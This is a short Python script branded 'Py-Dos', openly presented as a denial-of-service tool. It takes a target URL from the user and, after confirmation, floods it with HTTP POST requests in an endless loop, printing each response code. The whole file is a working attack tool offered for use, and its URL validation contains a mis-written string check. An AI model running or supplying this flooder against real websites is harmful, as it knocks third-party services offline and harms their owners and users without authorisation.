import pyfiglet
from termcolor import colored
import time
import requests


def attack():
    global url
    i=0
    while True:
        time.sleep(0.01)
        post_=requests.post(url)
        if post_.status_code == 200 :
            print(colored(f"{i} >>> ","light_yellow")+colored(post_,"light_green"))
            i+=1
        
        else :
            print(colored(f"{i} >>> ","light_yellow")+colored(post_,"red"))
            i+=1



t=pyfiglet.figlet_format("Py-Dos")
text=colored(t,"blue")
print(text)
print(colored("Welcome to Py-Dos tool !!!","green"))
print(colored("This tool for Dos attack .","white"))
print(colored("But this tool doesn't power , and they can find you and find your ip .","light_red"))
dangerous=pyfiglet.figlet_format("So this is DANGEROUS !",font="digital")
print(colored(dangerous,"red"))



url=input(colored("|__>","light_blue")+" please enter your url target : ")
while len(url)==0 or len(url)<=2 or not "." in url or not "http://" "https://" in url :
    if len(url)==0 or len(url)<=2:
        print(colored("[*]","red")+" you didn't write any think in input ")
        url=input(colored("[*]","yellow")+" please enter your url target : ")

    elif not "." in url:
        print(colored("[*]","red")+" you didn't write domain ")
        url=input(colored("[*]","yellow")+" please enter your url target : ")  

    elif  "http://" in url or "https://" in url :
        break
    

    else :
        print(colored("[*]","red")+""" your url target hasn't got "https://" or "http://" """)
        url=input(colored("[*]","yellow")+" please enter your url target : ")



show_target=f"your target : {url}"
print(colored(show_target,"light_cyan"))

continue_y_n=input(colored("if you want to start attack to your target enter y/n : "))
yes=continue_y_n.lower()
if yes=='yes' or yes=='y' :
    attack()


else :
    print(colored(pyfiglet.figlet_format("Ok ! Goodbye !"),"green"))
    input()

# import pyfiglet
# print(pyfiglet.FigletFont.getFonts())